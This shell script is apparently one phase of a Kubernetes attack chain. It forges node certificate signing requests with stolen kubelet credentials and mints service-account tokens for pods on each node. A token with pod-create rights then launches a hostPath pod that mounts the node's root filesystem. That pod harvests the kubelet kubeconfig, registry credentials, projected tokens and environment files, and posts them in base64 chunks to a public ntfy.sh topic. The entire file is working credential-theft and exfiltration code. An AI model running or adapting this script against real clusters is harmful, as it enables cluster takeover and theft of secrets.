#!/bin/sh
# i5831 phase 7: mint pod-bound SA tokens, then use the hub SA (pods create)
# to launch a hostPath pod that exfiltrates node kubelet config + mounted
# secrets to an ntfy topic (pods/log is not granted to node or SA identities).
set -u
mkdir -p /out
A=https://kubernetes.default.svc
PT=$(cat /k/kube-proxy-token.txt)
TOPIC="i5831x$RANDOM$RANDOM"
echo "TOPIC=$TOPIC"
rnd(){ openssl rand -hex 4; }
echo "===W0-BEGIN==="
SELF=$(curl -sS -m 8 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/name)
echo "[self:$SELF]"
curl -sS -m 12 -k -H "Authorization: Bearer $PT" "$A/api/v1/nodes" -o /out/nodes.json -w '[nodes:%{http_code}]'; echo
NODES=$(jq -r '.items[]?.metadata.name' /out/nodes.json 2>/dev/null)
[ -z "$NODES" ] && NODES="$SELF"
mkcsr() {
  N="$1"; TAG="$2"
  openssl req -new -newkey rsa:2048 -nodes -keyout /k/n-$TAG.key -out /k/n-$TAG.csr -subj "/CN=system:node:$N/O=system:nodes" 2>/dev/null
  REQ=$(base64 -w0 /k/n-$TAG.csr)
  jq -c -n --arg n "nc-$TAG-$RANDOM" --arg r "$REQ" --arg u "system:node:$N" '{apiVersion:"certificates.k8s.io/v1",kind:"CertificateSigningRequest",metadata:{name:$n},spec:{request:$r,signerName:"kubernetes.io/kube-apiserver-client-kubelet",usages:["digital signature","client auth"],username:$u}}' > /tmp/csr-$TAG.json
  NM=$(jq -r .metadata.name /tmp/csr-$TAG.json)
  curl -sS -m 12 -k --cacert /k/ca.crt --cert /k/kubelet.crt --key /k/kubelet.key -H 'Content-Type: application/json' -X POST --data-binary @/tmp/csr-$TAG.json "$A/apis/certificates.k8s.io/v1/certificatesigningrequests" -o /dev/null -w "[csr:$N:%{http_code}]"
  i=0
  while [ $i -lt 10 ]; do
    curl -sS -m 10 -k --cacert /k/ca.crt --cert /k/kubelet.crt --key /k/kubelet.key "$A/apis/certificates.k8s.io/v1/certificatesigningrequests/$NM" -o /tmp/csrg-$TAG.json
    CERT=$(jq -r '.status.certificate // empty' /tmp/csrg-$TAG.json 2>/dev/null)
    if [ -n "$CERT" ]; then echo "$CERT" | base64 -d > /k/n-$TAG.crt; echo " signed"; break; fi
    i=$((i+1)); sleep 2
  done
}
TOKF=/out/tokens.txt; : > $TOKF
for N in $NODES; do
  if [ "$N" = "$SELF" ]; then TAG=self; else TAG=$(echo "$N" | md5sum | cut -c1-6); fi
  mkcsr "$N" "$TAG"
  [ -s /k/n-$TAG.crt ] || continue
  CC="--cacert /k/ca.crt --cert /k/n-$TAG.crt --key /k/n-$TAG.key"
  curl -sS -m 15 -k $CC "$A/api/v1/pods?fieldSelector=spec.nodeName=$N" -o /out/pods-$TAG.json -w "[pods:$N:%{http_code}]"; echo
  jq -r '.items[]? | "\(.metadata.namespace)|\(.spec.serviceAccountName // "default")|\(.metadata.name)|\(.metadata.uid)"' /out/pods-$TAG.json 2>/dev/null | sort -u > /out/sas-$TAG.txt
  while IFS='|' read -r NS SA PN UID; do
    [ -z "$NS" ] && continue
    BODY=$(jq -c -n --arg pn "$PN" --arg uid "$UID" '{apiVersion:"authentication.k8s.io/v1",kind:"TokenRequest",spec:{boundObjectRef:{apiVersion:"v1",kind:"Pod",name:$pn,uid:$uid}}}')
    R=$(curl -sS -m 10 -k $CC -H 'Content-Type: application/json' -X POST -d "$BODY" -w '\n[%{http_code}]' "$A/api/v1/namespaces/$NS/serviceaccounts/$SA/token")
    TK=$(echo "$R" | sed '$d' | jq -r '.status.token // empty' 2>/dev/null)
    [ -n "$TK" ] && echo "$NS|$SA|$PN|$TK" >> $TOKF
  done < /out/sas-$TAG.txt
done
echo "[tokens:$(wc -l < $TOKF)]"
ssar() { jq -c -n --arg r "$3" --arg v "$4" --arg n "$2" '{apiVersion:"authorization.k8s.io/v1",kind:"SelfSubjectAccessReview",spec:{resourceAttributes:{verb:$v,resource:$r,namespace:$n}}}' > /tmp/sar.json; curl -sS -m 10 -k -H 'Content-Type: application/json' -H "Authorization: Bearer $1" -X POST --data-binary @/tmp/sar.json "$A/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" | jq -r '.status.allowed' 2>/dev/null; }
echo "--- pod-create rights"
while IFS='|' read -r NS SA PN TK; do
  [ -z "$TK" ] && continue
  P1=$(ssar "$TK" "$NS" pods create)
  echo "[right:$NS/$SA/$PN:pods=$P1]"
  echo "$NS|$SA|$PN|$P1|$TK" >> /out/rights.txt
done < $TOKF
echo "===W0-END==="
echo "===W1-BEGIN==="
CL="$TOPIC"
for ROW in $(awk -F'|' '$4=="true"{print $1"#"$2"#"$3}' /out/rights.txt); do
  NS=${ROW%%#*}; REST=${ROW#*#}; SA=${REST%%#*}; PN=${REST#*#}
  TK=$(awk -F'|' -v n="$NS" -v s="$SA" -v p="$PN" '$1==n&&$2==s&&$3==p{print $5;exit}' /out/rights.txt)
  [ -z "$TK" ] && continue
  PN2="hx-$RANDOM"
  SCRIPT=$(cat <<'HS'
set -u
SINK="__URL__"
O=/tmp/o.txt
{
echo HOSTBEGIN
id
echo KUBECONFIG; cat /h/etc/kubernetes/kubelet-kubeconfig 2>/dev/null | head -c 6000; echo
echo KUBELETCFG; cat /h/etc/kubernetes/kubelet-config.yaml 2>/dev/null | head -c 1500; echo
echo MANIFESTS; ls -la /h/etc/kubernetes/manifests 2>/dev/null | head -20
echo DOCKERCFG
for f in /h/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/config.json /h/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/.dockerconfigjson /h/root/.docker/config.json; do echo "F:$f"; head -c 4000 "$f" 2>/dev/null; echo; done
echo TOKS
for t in /h/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token; do [ -f "$t" ] && { echo "T:$t"; head -c 1200 "$t"; echo; }; done
echo ENVFILES
for f in /h/proc/1/environ /h/etc/environment /h/etc/default/instance_configs.cfg; do echo "E:$f"; tr "\0" "\n" < "$f" 2>/dev/null | head -c 1200; echo; done
echo DIND; ls -la /h/var/run/dind /h/run/dind 2>/dev/null | head -20
echo HOSTEND
} > $O 2>&1
wc -c < $O
base64 -w0 $O > /tmp/b64
split -b 2600 /tmp/b64 /tmp/c
N=$(ls /tmp/c* 2>/dev/null | wc -l)
wget -q -O - --header="Content-Type: text/plain" --post-data="meta chunks=$N bytes=$(wc -c < $O)" "$SINK" 2>/dev/null
for f in /tmp/c*; do
  for try in 1 2 3; do
    wget -q -O - --header="Content-Type: text/plain" --post-data="$(cat $f)" "$SINK" 2>/dev/null && break
    sleep 1
  done
done
wget -q -O - --header="Content-Type: text/plain" --post-data="end" "$SINK" 2>/dev/null
echo POSTED
HS
)
  SCRIPT=$(echo "$SCRIPT" | sed "s|__URL__|https://ntfy.sh/$CL|")
  jq -c -n --arg n "$PN2" --arg s "$SCRIPT" --arg nd "$SELF" --arg ns "$NS" '{apiVersion:"v1",kind:"Pod",metadata:{name:$n,namespace:$ns},spec:{nodeName:$nd,restartPolicy:"Never",containers:[{name:"d",image:"alpine:3.20",command:["sh","-c",$s],volumeMounts:[{name:"h",mountPath:"/h"}]}],volumes:[{name:"h",hostPath:{path:"/"}}]}}' > /tmp/hp.json
  echo "-- hostpod create via $NS/$SA ($PN2)"
  CODE=$(curl -sS -m 12 -k -H "Authorization: Bearer $TK" -H 'Content-Type: application/json' -X POST --data-binary @/tmp/hp.json "$A/api/v1/namespaces/$NS/pods" -o /tmp/hpr.json -w '%{http_code}')
  echo "[create:$CODE]"; head -c 200 /tmp/hpr.json; echo
  [ "$CODE" = "201" ] || continue
  sleep 8
  echo "-- pod status $PN2"; curl -sS -m 10 -k -H "Authorization: Bearer $TK" "$A/api/v1/namespaces/$NS/pods/$PN2" | jq -c '{phase:.status.phase,cs:[.status.containerStatuses[]?|{ready:.ready,state:.state}]}' 2>/dev/null | head -c 400; echo
  break
done
echo "===W1-END==="
echo "===ALLDONE9==="
